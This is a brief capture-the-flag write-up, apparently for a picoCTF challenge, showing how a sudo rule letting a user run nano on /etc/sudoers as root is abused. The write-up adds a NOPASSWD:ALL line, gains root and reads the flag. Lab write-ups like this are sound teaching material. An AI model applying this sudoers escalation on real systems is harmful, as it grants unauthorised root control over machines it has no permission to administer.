# ABSOLUTE NANO — picoCTF 2026

Connect to the challenge:

    ssh -p 55852 ctf-player@crystal-peak.picoctf.net

List files:

    ls -la

Found nothing, and no way to read `flag.txt`.

Check `/opt`:

    ls -l /opt
      build.sh
      start.sh

Inspect the build script:

    cat /opt/build.sh
    /usr/sbin/useradd -s /bin/bash -m ctf-player
    PASS=$(hexdump -vn 4 -e ' /1 "%02x"' /dev/random)
    echo "ctf-player:$PASS" | chpasswd
    echo "ctf-player ALL=(ALL) NOPASSWD: /bin/nano /etc/sudoers" >> /etc/sudoers
    echo -n $PASS > /tmp/pass.txt
    mkdir -p /home/ctf-player/

Key insight:
- The user is allowed to run **nano on /etc/sudoers as root without a password**.
- That means you can escalate to full root by editing sudoers.

Run nano with sudo:

    sudo nano /etc/sudoers

Add this line:

    ctf-player ALL=(ALL) NOPASSWD:ALL

Save and exit nano.

Now you have full root:

    sudo id
    uid=0(root) gid=0(root) groups=0(root)

Read the flag:

    sudo cat flag.txt
